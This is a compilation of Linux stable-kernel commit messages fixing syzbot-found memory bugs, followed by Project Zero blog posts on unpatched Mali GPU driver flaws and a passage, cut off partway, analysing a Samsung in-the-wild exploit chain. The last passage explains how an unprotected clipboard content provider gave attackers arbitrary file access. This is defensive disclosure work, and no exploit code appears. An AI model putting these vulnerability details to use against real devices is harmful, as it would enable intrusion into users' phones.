commit 2191c00855b03aa59c20e698be713d952d51fc18 upstream.
The syzbot fuzzer found a race between uevent callbacks and gadget
driver unregistration that can cause a use-after-free bug:
---------------------------------------------------------------
BUG: KASAN: use-after-free in usb\_udc\_uevent+0x11f/0x130
drivers/usb/gadget/udc/core.c:1732
Read of size 8 at addr ffff888078ce2050 by task udevd/2968
CPU: 1 PID: 2968 Comm: udevd Not tainted 5.19.0-rc4-next-20220628-syzkaller #0
Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS Google
06/29/2022
Call Trace:
\_\_dump\_stack lib/dump\_stack.c:88 [inline]
dump\_stack\_lvl+0xcd/0x134 lib/dump\_stack.c:106
print\_address\_description mm/kasan/report.c:317 [inline]
print\_report.cold+0x2ba/0x719 mm/kasan/report.c:433
kasan\_report+0xbe/0x1f0 mm/kasan/report.c:495
usb\_udc\_uevent+0x11f/0x130 drivers/usb/gadget/udc/core.c:1732
dev\_uevent+0x290/0x770 drivers/base/core.c:2424
---------------------------------------------------------------
The bug occurs because usb\_udc\_uevent() dereferences udc->driver but
does so without acquiring the udc\_lock mutex, which protects this
field. If the gadget driver is unbound from the udc concurrently with
uevent processing, the driver structure may be accessed after it has
been deallocated.
To prevent the race, we make sure that the routine holds the mutex
around the racing accesses.
Link:
CC: stable@vger.kernel.org # fc274c1e9973
Reported-and-tested-by: syzbot+b0de012ceb1e2a97891b@syzkaller.appspotmail.com
Signed-off-by: Alan Stern
Link: https://lore.kernel.org/r/YtlrnhHyrHsSky9m@rowland.harvard.edu
Signed-off-by: Greg Kroah-Hartman
commit c02d2a91a85c4c4d05826cd1ea74a9b8d42e4280
Author: Dongliang Mu
Date: Thu Jun 9 08:35:28 2022 +0100
media: pvrusb2: fix memory leak in pvr\_probe
commit 945a9a8e448b65bec055d37eba58f711b39f66f0 upstream.
The error handling code in pvr2\_hdw\_create forgets to unregister the
v4l2 device. When pvr2\_hdw\_create returns back to pvr2\_context\_create,
it calls pvr2\_context\_destroy to destroy context, but mp->hdw is NULL,
which leads to that pvr2\_hdw\_destroy directly returns.
Fix this by adding v4l2\_device\_unregister to decrease the refcount of
usb interface.
Reported-by: syzbot+77b432d57c4791183ed4@syzkaller.appspotmail.com
Signed-off-by: Dongliang Mu
Signed-off-by: Hans Verkuil
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit f2f6ea1a8da1317430a84701fc0170449ee88315
Author: Vivek Kasireddy
Date: Fri May 20 13:52:35 2022 -0700
udmabuf: Set the DMA mask for the udmabuf device (v2)
commit 9e9fa6a9198b767b00f48160800128e83a038f9f upstream.
If the DMA mask is not set explicitly, the following warning occurs
when the userspace tries to access the dma-buf via the CPU as
reported by syzbot here:
WARNING: CPU: 1 PID: 3595 at kernel/dma/mapping.c:188
\_\_dma\_map\_sg\_attrs+0x181/0x1f0 kernel/dma/mapping.c:188
Modules linked in:
CPU: 0 PID: 3595 Comm: syz-executor249 Not tainted
5.17.0-rc2-syzkaller-00316-g0457e5153e0e #0
Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS
Google 01/01/2011
RIP: 0010:\_\_dma\_map\_sg\_attrs+0x181/0x1f0 kernel/dma/mapping.c:188
Code: 00 00 00 00 00 fc ff df 48 c1 e8 03 80 3c 10 00 75 71 4c 8b 3d c0
83 b5 0d e9 db fe ff ff e8 b6 0f 13 00 0f 0b e8 af 0f 13 00 <0f> 0b 45
31 e4 e9 54 ff ff ff e8 a0 0f 13 00 49 8d 7f 50 48 b8 00
RSP: 0018:ffffc90002a07d68 EFLAGS: 00010293
RAX: 0000000000000000 RBX: 0000000000000000 RCX: 0000000000000000
RDX: ffff88807e25e2c0 RSI: ffffffff81649e91 RDI: ffff88801b848408
RBP: ffff88801b848000 R08: 0000000000000002 R09: ffff88801d86c74f
R10: ffffffff81649d72 R11: 0000000000000001 R12: 0000000000000002
R13: ffff88801d86c680 R14: 0000000000000001 R15: 0000000000000000
FS: 0000555556e30300(0000) GS:ffff8880b9d00000(0000)
knlGS:0000000000000000
CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00000000200000cc CR3: 000000001d74a000 CR4: 00000000003506e0
DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
Call Trace:
dma\_map\_sgtable+0x70/0xf0 kernel/dma/mapping.c:264
get\_sg\_table.isra.0+0xe0/0x160 drivers/dma-buf/udmabuf.c:72
begin\_cpu\_udmabuf+0x130/0x1d0 drivers/dma-buf/udmabuf.c:126
dma\_buf\_begin\_cpu\_access+0xfd/0x1d0 drivers/dma-buf/dma-buf.c:1164
dma\_buf\_ioctl+0x259/0x2b0 drivers/dma-buf/dma-buf.c:363
vfs\_ioctl fs/ioctl.c:51 [inline]
\_\_do\_sys\_ioctl fs/ioctl.c:874 [inline]
\_\_se\_sys\_ioctl fs/ioctl.c:860 [inline]
\_\_x64\_sys\_ioctl+0x193/0x200 fs/ioctl.c:860
do\_syscall\_x64 arch/x86/entry/common.c:50 [inline]
do\_syscall\_64+0x35/0xb0 arch/x86/entry/common.c:80
entry\_SYSCALL\_64\_after\_hwframe+0x44/0xae
RIP: 0033:0x7f62fcf530f9
Code: 28 c3 e8 2a 14 00 00 66 2e 0f 1f 84 00 00 00 00 00 48 89 f8 48 89
f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01
f0 ff ff 73 01 c3 48 c7 c1 c0 ff ff ff f7 d8 64 89 01 48
RSP: 002b:00007ffe3edab9b8 EFLAGS: 00000246 ORIG\_RAX: 0000000000000010
RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f62fcf530f9
RDX: 0000000020000200 RSI: 0000000040086200 RDI: 0000000000000006
RBP: 00007f62fcf170e0 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 00007f62fcf17170
R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000

v2: Dont't forget to deregister if DMA mask setup fails.
Reported-by: syzbot+10e27961f4da37c443b2@syzkaller.appspotmail.com
Cc: Gerd Hoffmann
Signed-off-by: Vivek Kasireddy
Link: http://patchwork.freedesktop.org/patch/msgid/20220520205235.3687336-1-vivek.kasireddy@intel.com
Signed-off-by: Gerd Hoffmann
Signed-off-by: Greg Kroah-Hartman
commit dee1e51b54794e90763e70a3c78f27ba4fa930ec
Author: Lee Jones
Date: Fri Jul 8 08:40:09 2022 +0100
HID: steam: Prevent NULL pointer dereference in steam\_{recv,send}\_report
commit cd11d1a6114bd4bc6450ae59f6e110ec47362126 upstream.
It is possible for a malicious device to forgo submitting a Feature
Report. The HID Steam driver presently makes no prevision for this
and de-references the 'struct hid\_report' pointer obtained from the
HID devices without first checking its validity. Let's change that.
Cc: Jiri Kosina
Cc: Benjamin Tissoires
Cc: linux-input@vger.kernel.org
Fixes: c164d6abf3841 ("HID: add driver for Valve Steam Controller")
Signed-off-by: Lee Jones
Signed-off-by: Jiri Kosina
Signed-off-by: Greg Kroah-Hartman
commit adb9caabcd16a4a7535f3fcce79d98eab185d434
Author: Greg Kroah-Hartman
Date: Thu Sep 1 13:01:03 2022 +0200
Revert "PCI/portdrv: Don't disable AER reporting in get\_port\_device\_capability()"
This reverts commit 65e393fddc5379b2c41ca7e73cd4bb9572c4d90e which is
commit 8795e182b02dc87e343c79e73af6b8b7f9c5e635 upstream.
It is reported to cause problems, so drop it from the stable trees for
now until it gets sorted out.
Link: https://lore.kernel.org/r/47b775c5-57fa-5edf-b59e-8a9041ffbee7@candelatech.com
Reported-by: Ben Greear
Cc: Stefan Roese
Cc: Bjorn Helgaas
Cc: Pali Rohár
Cc: Rafael J. Wysocki
Cc: Bharat Kumar Gogada
Cc: Michal Simek
Cc: Yao Hongbo
Cc: Naveen Naidu
Cc: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit e8fcbce5424966ddbe9e426c163b2e63ff91b789
Author: Luiz Augusto von Dentz
Date: Fri Aug 12 15:33:57 2022 -0700
Bluetooth: L2CAP: Fix build errors in some archs
commit b840304fb46cdf7012722f456bce06f151b3e81b upstream.
This attempts to fix the follow errors:
In function 'memcmp',
inlined from 'bacmp' at ./include/net/bluetooth/bluetooth.h:347:9,
inlined from 'l2cap\_global\_chan\_by\_psm' at
net/bluetooth/l2cap\_core.c:2003:15:
./include/linux/fortify-string.h:44:33: error: '\_\_builtin\_memcmp'
specified bound 6 exceeds source size 0 [-Werror=stringop-overread]
44 | #define \_\_underlying\_memcmp \_\_builtin\_memcmp
| ^
./include/linux/fortify-string.h:420:16: note: in expansion of macro
'\_\_underlying\_memcmp'
420 | return \_\_underlying\_memcmp(p, q, size);
| ^~~~~~~~~~~~~~~~~~~
In function 'memcmp',
inlined from 'bacmp' at ./include/net/bluetooth/bluetooth.h:347:9,
inlined from 'l2cap\_global\_chan\_by\_psm' at
net/bluetooth/l2cap\_core.c:2004:15:
./include/linux/fortify-string.h:44:33: error: '\_\_builtin\_memcmp'
specified bound 6 exceeds source size 0 [-Werror=stringop-overread]
44 | #define \_\_underlying\_memcmp \_\_builtin\_memcmp
| ^
./include/linux/fortify-string.h:420:16: note: in expansion of macro
'\_\_underlying\_memcmp'
420 | return \_\_underlying\_memcmp(p, q, size);
| ^~~~~~~~~~~~~~~~~~~
Fixes: 332f1795ca20 ("Bluetooth: L2CAP: Fix l2cap\_global\_chan\_by\_psm regression")
Signed-off-by: Luiz Augusto von Dentz
Cc: Sudip Mukherjee
Signed-off-by: Greg Kroah-Hartman
commit d3916da4bc6c022c9c41c576f6538fa78e5ce746
Author: James Morse
Date: Mon Jul 4 16:57:32 2022 +0100
arm64: errata: Add Cortex-A510 to the repeat tlbi list
commit 39fdb65f52e9a53d32a6ba719f96669fd300ae78 upstream.
Cortex-A510 is affected by an erratum where in rare circumstances the
CPUs may not handle a race between a break-before-make sequence on one
CPU, and another CPU accessing the same page. This could allow a store
to a page that has been unmapped.
Work around this by adding the affected CPUs to the list that needs
TLB sequences to be done twice.
Signed-off-by: James Morse
Link: https://lore.kernel.org/r/20220704155732.21216-1-james.morse@arm.com
Signed-off-by: Will Deacon
Cc: Lucas Wei
Signed-off-by: Greg Kroah-Hartman
commit a8ba16e9f171e9638401ff39daebdd2b84553e2d
Author: Akira Yokosawa
Date: Mon Aug 8 17:53:57 2022 +0900
docs: kerneldoc-preamble: Test xeCJK.sty before loading
commit cee7db1b0239468b22c295cf04a8c40c34ecd35a upstream.
On distros whose texlive packaging is fine-grained, texlive-xecjk
can be installed/removed independently of other texlive packages.
Conditionally loading xeCJK depending only on the existence of the
"Noto Sans CJK SC" font might end up in xelatex error of
"xeCJK.sty not found!".
Improve the situation by testing existence of xeCJK.sty before
loading it.
This is useful on RHEL 9 and its clone distros where texlive-xecjk
doesn't work at the moment due to a missing dependency [1].
"make pdfdocs" for non-CJK contents should work after removing
texlive-xecjk.
Link: [1] https://bugzilla.redhat.com/show\_bug.cgi?id=2086254
Fixes: 398f7abdcb7e ("docs: pdfdocs: Pull LaTeX preamble part out of conf.py")
Cc: stable@vger.kernel.org # v5.18+
Signed-off-by: Akira Yokosawa
Acked-by: Mauro Carvalho Chehab
Link: https://lore.kernel.org/r/c24c2a87-70b2-5342-bcc9-de467940466e@gmail.com
Signed-off-by: Jonathan Corbet
Signed-off-by: Greg Kroah-Hartman
commit e120a63532946bad71dc6255579a3219a9caf66c
Author: Eric Biggers
Date: Thu Aug 25 22:04:56 2022 -0700
crypto: lib - remove unneeded selection of XOR\_BLOCKS
commit 874b301985ef2f89b8b592ad255e03fb6fbfe605 upstream.
CRYPTO\_LIB\_CHACHA\_GENERIC doesn't need to select XOR\_BLOCKS. It perhaps
was thought that it's needed for \_\_crypto\_xor, but that's not the case.
Enabling XOR\_BLOCKS is problematic because the XOR\_BLOCKS code runs a
benchmark when it is initialized. That causes a boot time regression on
systems that didn't have it enabled before.
Therefore, remove this unnecessary and problematic selection.
Fixes: e56e18985596 ("lib/crypto: add prompts back to crypto libraries")
Cc: stable@vger.kernel.org
Signed-off-by: Eric Biggers
Signed-off-by: Herbert Xu
Signed-off-by: Greg Kroah-Hartman
commit 515af71adf3d5e05587c7bb27c1725c20cd259a0
Author: Timo Alho
Date: Wed Jun 22 16:22:59 2022 +0300
firmware: tegra: bpmp: Do only aligned access to IPC memory area
commit a4740b148a04dc60e14fe6a1dfe216d3bae214fd upstream.
Use memcpy\_toio and memcpy\_fromio variants of memcpy to guarantee no
unaligned access to IPC memory area. This is to allow the IPC memory to
be mapped as Device memory to further suppress speculative reads from
happening within the 64 kB memory area above the IPC memory when 64 kB
memory pages are used.
Signed-off-by: Timo Alho
Signed-off-by: Mikko Perttunen
Signed-off-by: Thierry Reding
Cc: Jon Hunter
Signed-off-by: Greg Kroah-Hartman
commit 1cf82931822dbf3b24945147b5330d8fdd86cdff
Author: Maxime Ripard
Date: Wed Jun 29 14:34:36 2022 +0200
drm/vc4: hdmi: Depends on CONFIG\_PM
commit 72e2329e7c9bbe15e7a813670497ec9c6f919af3 upstream.
We already depend on runtime PM to get the power domains and clocks for
most of the devices supported by the vc4 driver, so let's just select it
to make sure it's there.
Link: https://lore.kernel.org/r/20220629123510.1915022-38-maxime@cerno.tech
Acked-by: Thomas Zimmermann
Tested-by: Stefan Wahren
Signed-off-by: Maxime Ripard
(cherry picked from commit f1bc386b319e93e56453ae27e9e83817bb1f6f95)
Signed-off-by: Maxime Ripard
Cc: "Sudip Mukherjee (Codethink)"
Signed-off-by: Greg Kroah-Hartman
commit 1a289a16857062e704da52683a49aaf16e826cbf
Author: Maxime Ripard
Date: Wed Jun 29 14:34:37 2022 +0200
drm/vc4: hdmi: Rework power up
commit 258e483a4d5e97a6a8caa74381ddc1f395ac1c71 upstream.
The current code tries to handle the case where CONFIG\_PM isn't selected
by first calling our runtime\_resume implementation and then properly
report the power state to the runtime\_pm core.
This allows to have a functionning device even if pm\_runtime\_get\_\*
functions are nops.
However, the device power state if CONFIG\_PM is enabled is
RPM\_SUSPENDED, and thus our vc4\_hdmi\_write() and vc4\_hdmi\_read() calls
in the runtime\_pm hooks will now report a warning since the device might
not be properly powered.
Even more so, we need CONFIG\_PM enabled since the previous RaspberryPi
have a power domain that needs to be powered up for the HDMI controller
to be usable.
The previous patch has created a dependency on CONFIG\_PM, now we can
just assume it's there and only call pm\_runtime\_resume\_and\_get() to make
sure our device is powered in bind.
Link: https://lore.kernel.org/r/20220629123510.1915022-39-maxime@cerno.tech
Acked-by: Thomas Zimmermann
Tested-by: Stefan Wahren
Signed-off-by: Maxime Ripard
(cherry picked from commit 53565c28e6af2cef6bbf438c34250135e3564459)
Signed-off-by: Maxime Ripard
Cc: "Sudip Mukherjee (Codethink)"
Signed-off-by: Greg Kroah-Hartman


=== Content from bugs.chromium.org_8096d9c7_20250115_225526.html ===



=== Content from googleprojectzero.blogspot.com_797c7a49_20250115_225527.html ===


# [Project Zero](https://googleprojectzero.blogspot.com/)

News and updates from the Project Zero team at Google

## Tuesday, November 22, 2022

### [Mind the Gap](https://googleprojectzero.blogspot.com/2022/11/mind-the-gap.html)

By Ian Beer, Project Zero

Note: The vulnerabilities discussed in this blog post (CVE-2022-33917) are fixed by the upstream vendor, but at the time of publication, these fixes have not yet made it downstream to affected Android devices (including Pixel, Samsung, Xiaomi, Oppo and others). Devices with a Mali GPU are currently vulnerable.

## Introduction

In June 2022, Project Zero researcher Maddie Stone gave a talk at [FirstCon22](https://www.first.org/conference/2022/) titled [0-day In-the-Wild Exploitation in 2022…so far](https://googleprojectzero.blogspot.com/2022/06/2022-0-day-in-wild-exploitationso-far.html). A key takeaway was that approximately 50% of the observed 0-days in the first half of 2022 were variants of previously patched vulnerabilities. This finding is consistent with our understanding of attacker behavior: attackers will take the path of least resistance, and as long as vendors don't consistently perform thorough root-cause analysis when fixing security vulnerabilities, it will continue to be worth investing time in trying to revive known vulnerabilities before looking for novel ones.

The presentation discussed an in the wild exploit targeting the Pixel 6 and leveraging CVE-2021-39793, a vulnerability in the ARM Mali GPU driver used by a large number of other Android devices. ARM's advisory described the vulnerability as:

Title                    Mali GPU Kernel Driver may elevate CPU RO pages to writable

CVE                   CVE-2022-22706 (also reported in CVE-2021-39793)

Date of issue      6th January 2022

Impact                A non-privileged user can get a write access to read-only memory pages [sic].

The week before FirstCon22, Maddie gave an internal preview of her talk. Inspired by the description of an in-the-wild vulnerability in low-level memory management code, fellow Project Zero researcher Jann Horn started auditing the ARM Mali GPU driver. Over the next three weeks, Jann found five more exploitable vulnerabilities ([2325](https://bugs.chromium.org/p/project-zero/issues/detail?id=2325), [2327](https://bugs.chromium.org/p/project-zero/issues/detail?id=2327), [2331](https://bugs.chromium.org/p/project-zero/issues/detail?id=2331), [2333](https://bugs.chromium.org/p/project-zero/issues/detail?id=2333), [2334](https://bugs.chromium.org/p/project-zero/issues/detail?id=2334)).

## Taking a closer look

One of these issues ([2334](https://bugs.chromium.org/p/project-zero/issues/detail?id=2334)) lead to kernel memory corruption, one ([2331](https://bugs.chromium.org/p/project-zero/issues/detail?id=2331)) lead to physical memory addresses being disclosed to userspace and the remaining three ([2325](https://bugs.chromium.org/p/project-zero/issues/detail?id=2325), [2327](https://bugs.chromium.org/p/project-zero/issues/detail?id=2327), [2333](https://bugs.chromium.org/p/project-zero/issues/detail?id=2333)) lead to a physical page use-after-free condition. These would enable an attacker to continue to read and write physical pages after they had been returned to the system.

For example, by forcing the kernel to [reuse these pages as page tables](https://googleprojectzero.blogspot.com/2021/10/how-simple-linux-kernel-memory.html), an attacker with native code execution in an app context could gain full access to the system, bypassing Android's permissions model and allowing broad access to user data.

Anecdotally, we heard from multiple sources that the Mali issues we had reported collided with vulnerabilities available in the 0-day market, and we even saw one [public reference](https://twitter.com/jgrusko/status/1571921203723440135):

[![@ProjectZeroBugs\nArm Mali: driver exposes physical addresses to unprivileged userspace\n\n
 @jgrusko Replying to @ProjectZeroBugs\nRIP the feature that was there forever and nobody wanted to report :)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHlABpgRGtGMlLmoEY3wDYvg13cwbxPVGScpjHBa0wa8vaohGjhB9YkYuIyfxxnm2iWh4czqp1YUdMCrSgy-dtdlZ8FkLV5IDrQZ1SSCNUoYjsJlHdPoOjtUar_uHQda_aAUu75_4sUUAFjM7Jvr-d6JOMHD7AexIZMXDsdrZIdKX7aA4wrhRC6PCD/s1200/tweet.png "@ProjectZeroBugs\nArm Mali: driver exposes physical addresses to unprivileged userspace\n\n
 @jgrusko Replying to @ProjectZeroBugs\nRIP the feature that was there forever and nobody wanted to report :)")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHlABpgRGtGMlLmoEY3wDYvg13cwbxPVGScpjHBa0wa8vaohGjhB9YkYuIyfxxnm2iWh4czqp1YUdMCrSgy-dtdlZ8FkLV5IDrQZ1SSCNUoYjsJlHdPoOjtUar_uHQda_aAUu75_4sUUAFjM7Jvr-d6JOMHD7AexIZMXDsdrZIdKX7aA4wrhRC6PCD/s1420/tweet.png)

## The "Patch gap" is for vendors, too

We reported these five issues to ARM when they were discovered between June and July 2022. ARM fixed the issues promptly in July and August 2022, disclosing them as security issues on their [Arm Mali Driver Vulnerabilities](https://developer.arm.com/Arm%20Security%20Center/Mali%20GPU%20Driver%20Vulnerabilities) page (assigning [CVE-2022-36449](https://nvd.nist.gov/vuln/detail/CVE-2022-36449)) and publishing the [patched driver source on their public developer website](https://developer.arm.com/downloads/-/mali-drivers/valhall-kernel).

In line with our [2021 disclosure policy update](https://googleprojectzero.blogspot.com/2021/04/policy-and-disclosure-2021-edition.html) we then waited an additional 30 days before derestricting our Project Zero tracker entries. Between late August and mid-September 2022 we derestricted these issues in the public Project Zero tracker: [2325](https://bugs.chromium.org/p/project-zero/issues/detail?id=2325), [2327](https://bugs.chromium.org/p/project-zero/issues/detail?id=2327), [2331](https://bugs.chromium.org/p/project-zero/issues/detail?id=2331), [2333](https://bugs.chromium.org/p/project-zero/issues/detail?id=2333), [2334](https://bugs.chromium.org/p/project-zero/issues/detail?id=2334).

When time permits and as an additional check, we test the effectiveness of the patches that the vendor has provided. This sometimes leads to follow-up bug reports where a patch is incomplete or a variant is discovered (for a recently compiled list of examples, see [the first table in this blogpost](https://googleprojectzero.blogspot.com/2022/06/2022-0-day-in-wild-exploitationso-far.html)), and sometimes we discover the fix isn't there at all.

In this case we discovered that all of our test devices which used Mali are still vulnerable to these issues. CVE-2022-36449 is not mentioned in any downstream security bulletins.

## Conclusion

Just as users are recommended to patch as quickly as they can once a release containing security updates is available, so the same applies to vendors and companies. Minimizing the "patch gap" as a vendor in these scenarios is arguably more important, as end users (or other vendors downstream) are blocking on this action before they can receive the security benefits of the patch.

Companies need to remain vigilant, follow upstream sources closely, and do their best to provide complete patches to users as soon as possible.

Posted by

[Google Project Zero](https://www.blogger.com/profile/08975904405228580347 "author profile")

at

[1:05 PM](https://googleprojectzero.blogspot.com/2022/11/mind-the-gap.html "permanent link")

[No comments:](https://googleprojectzero.blogspot.com/2022/11/mind-the-gap.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4838136820032157985&postID=7519748497805371118&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=7519748497805371118&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=7519748497805371118&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=7519748497805371118&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=7519748497805371118&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=7519748497805371118&target=pinterest "Share to Pinterest")

## Friday, November 4, 2022

### [A Very Powerful Clipboard: Analysis of a Samsung in-the-wild exploit chain](https://googleprojectzero.blogspot.com/2022/11/a-very-powerful-clipboard-samsung-in-the-wild-exploit-chain.html)

Posted by Maddie Stone, Project Zero

Note: The three vulnerabilities discussed in this blog were all fixed in Samsung’s March 2021 release. They were fixed as CVE-2021-25337, CVE-2021-25369, CVE-2021-25370. To ensure your Samsung device is up-to-date under settings you can check that your device is running SMR Mar-2021 or later.

As defenders, in-the-wild exploit samples give us important insight into what attackers are really doing. We get the “ground truth” data about the vulnerabilities and exploit techniques they’re using, which then informs our further research and guidance to security teams on what could have the biggest impact or return on investment. To do this, we need to know that the vulnerabilities and exploit samples were found in-the-wild. Over the past few years there’s been tremendous progress in vendor’s transparently disclosing when a vulnerability is known to be exploited in-the-wild: Adobe, Android, Apple, ARM, Chrome, Microsoft, Mozilla, and others are sharing this information via their security release notes.

While we understand that Samsung has yet to annotate any vulnerabilities as in-the-wild, going forward, Samsung has committed to publicly sharing when vulnerabilities may be under limited, targeted exploitation, as part of their release notes.

We hope that, like Samsung, others will join their industry peers in disclosing when there is evidence to suggest that a vulnerability is being exploited in-the-wild in one of their products.

# The exploit sample

The Google Threat Analysis Group (TAG) obtained a partial exploit chain for Samsung devices that TAG believes belonged to a commercial surveillance vendor. These exploits were likely discovered in the testing phase. The sample is from late 2020. The chain merited further analysis because it is a 3 vulnerability chain where all 3 vulnerabilities are within Samsung custom components, including a vulnerability in a Java component. This exploit analysis was completed in collaboration with Clement Lecigne from TAG.

The sample used three vulnerabilities, all patched in March 2021 by Samsung:

1. Arbitrary file read/write via the clipboard provider - CVE-2021-25337
2. Kernel information leak via sec\_log - CVE-2021-25369
3. Use-after-free in the Display Processing Unit (DPU) driver - CVE-2021-25370

The exploit sample targets Samsung phones running kernel 4.14.113 with the Exynos SOC. Samsung phones run one of two types of SOCs depending on where they’re sold. For example the Samsung phones sold in the United States, China, and a few other countries use a Qualcomm SOC and phones sold most other places (ex. Europe and Africa) run an Exynos SOC. The exploit sample relies on both the Mali GPU driver and the DPU driver which are specific to the Exynos Samsung phones.

Examples of Samsung phones that were running kernel 4.14.113 in late 2020 (when this sample was found) include the S10, A50, and A51.

The in-the-wild sample that was obtained is a JNI native library file that would have been loaded as a part of an app. Unfortunately TAG did not obtain the app that would have been used with this library. Getting initial code execution via an application is a path that we’ve seen in other campaigns this year. [TAG](https://blog.google/threat-analysis-group/italian-spyware-vendor-targets-users-in-italy-and-kazakhstan/) and [Project Zero](https://googleprojectzero.blogspot.com/2022/06/curious-case-carrier-app.html) published detailed analyses of one of these campaigns in June.

# Vulnerability #1 - Arbitrary filesystem read and write

The exploit chain used CVE-2021-25337 for an initial arbitrary file read and write. The exploit is running as the untrusted\_app SELinux context, but uses the system\_server SELinux context to open files that it usually wouldn’t be able to access. This bug was due to a lack of access control in a custom Samsung clipboard provider that runs as the system user.

[![Screenshot of the CVE-2021-25337 entry from Samsung's March 2021 security update. It reads: &quot;SVE-2021-19527 (CVE-2021-25337): Arbitrary file read/write vulnerability via unprotected clipboard content provider  Severity: Moderate Affected versions: P(9.0), Q(10.0), R(11.0) devices except ONEUI 3.1 in R(11.0) Reported on: November 3, 2020 Disclosure status: Privately disclosed. An improper access control in clipboard service prior to SMR MAR-2021 Release 1 allows untrusted applications to read or write arbitrary files in the device. The patch adds the proper caller check to prevent improper access to clipboard service.](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnrMtDmG4HptsA4AWfg404rrysHRNHsnGwDE6LY1iWCH2ywFNiQy4qn6yuV9ONlcJ2_YilTV8pd1um42sMKqVhKQliJWco-ZF9Vq0z24fCavXMMcM6jsFLP-JDuw726K7zXOtvC5Cb4K_bWcNUkl3Y2hlWwiIGS0FOjkJNG1oWDSQ7bc9RGm6ZUQXN/s1104/image2.png "Screenshot of the CVE-2021-25337 entry from Samsung's March 2021 security update. It reads: &quot;SVE-2021-19527 (CVE-2021-25337): Arbitrary file read/write vulnerability via unprotected clipboard content provider  Severity: Moderate Affected versions: P(9.0), Q(10.0), R(11.0) devices except ONEUI 3.1 in R(11.0) Reported on: November 3, 2020 Disclosure status: Privately disclosed. An improper access control in clipboard service prior to SMR MAR-2021 Release 1 allows untrusted applications to read or write arbitrary files in the device. The patch adds the proper caller check to prevent improper access to clipboard service.")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnrMtDmG4HptsA4AWfg404rrysHRNHsnGwDE6LY1iWCH2ywFNiQy4qn6yuV9ONlcJ2_YilTV8pd1um42sMKqVhKQliJWco-ZF9Vq0z24fCavXMMcM6jsFLP-JDuw726K7zXOtvC5Cb4K_bWcNUkl3Y2hlWwiIGS0FOjkJNG1oWDSQ7bc9RGm6ZUQXN/s1104/image2.png)

## About Android content providers

In Android, [Content Providers](https://developer.android.com/guide/topics/providers/content-providers) manage the storage and system-wide access of different data. Content providers organize their data as tables with columns representing the type of data collected and the rows representing each piece of data. Content providers are [required to implement six abstract methods](https://developer.android.com/guide/topics/providers/content-provider-creating#ContentProvider): query, insert, update, delete, getType, and onCreate. All of these methods besides onCreate are called by a client application.

According to the [Android documentation](https://developer.android.com/guide/topics/providers/content-provider-creating#Permissions):

All applications can read from or write to your provider, even if the underlying data is private, because by default your provider does not have permissions set. To change this, set permissions for your provider in your manifest file, using attributes or child elements of the <provider> element. You can set permissions that apply to the entire provider, or to certain tables, or even to certain records, or all three.

## The vulnerability

Samsung created a custom clipboard content provider that runs within the system server. The [system server](https://cs.android.com/android/platform/superproject/%2B/master%3Aframeworks/base/services/java/com/android/server/SystemServer.java) is a very privileged process on Android that manages many of the services critical to the functioning of the device, such as the WifiService and TimeZoneDetectorService. The system server runs as the privileged system user (UID 1000, AID\_system) and under the system\_server SELinux context.

Samsung added a custom clipboard content provider to the system server. This custom clipboard provider is specifically for images. In the com.android.server.semclipboard.SemClipboardProvider class, there are the following variables:

        DATABASE\_NAME = ‘clipboardimage.db’

        TABLE\_NAME = ‘ClipboardImageTable’

        URL = ‘content://com.sec.android.semclipboardprovider/images’

        CREATE\_TABLE = " CREATE TABLE ClipboardImageTable (id INTEGER PRIMARY KEY AUTOINCREMENT,  \_data TEXT NOT NULL);";

Unlike content providers that live in “normal” apps and can restrict access via permissions in their manifest as explained above, content providers in the system server are responsible for restricting access in their own code. The system server is a single JAR (services.jar) on the firmware image and doesn’t have a manifest for any permissions to go in. Therefore it’s up to the code within the system server to do its own access checking.

UPDATE 10 Nov 2022: The system server code is not an app in its own right. Instead its code lives in a JAR, services.jar. Its manifest is found in /system/framework/framework-res.apk. In this case, the entry for the SemClipboardProvider in the manifest is:

| <provider android:name="com.android.server.semclipboard.SemClipboardProvider" android:enabled="true" android:exported="true" android:multiprocess="false" android:authorities="com.sec.android.semclipboardprovider" android:singleUser="true"/> |
| --- |

Like “normal” app-defined components, the system server could use the android:permission attribute to control access to the provider, but it does not. Since there is not a permission required to access the SemClipboardProvider via the manifest, any access control must come from the provider code itself. Thanks to Edward Cunningham for pointing this out!

The ClipboardImageTable defines only two columns for the table as seen above: id and \_data. The column name \_data has a special use in Android content providers. It can be used with the [openFileHelper](https://developer.android.com/reference/android/content/ContentProvider#openFileHelper(android.net.Uri,%20java.lang.String)) method to open a file at a specified path. Only the URI of the row in the table is passed to openFileHelper and a [ParcelFileDescriptor](https://developer.android.com/reference/android/os/ParcelFileDescriptor) object for the path stored in that row is returned. The ParcelFileDescriptor class then provides the [getFd](https://developer.android.com/reference/android/os/ParcelFileDescriptor#getFd()) method to get the native file descriptor (fd) for the returned ParcelFileDescriptor.

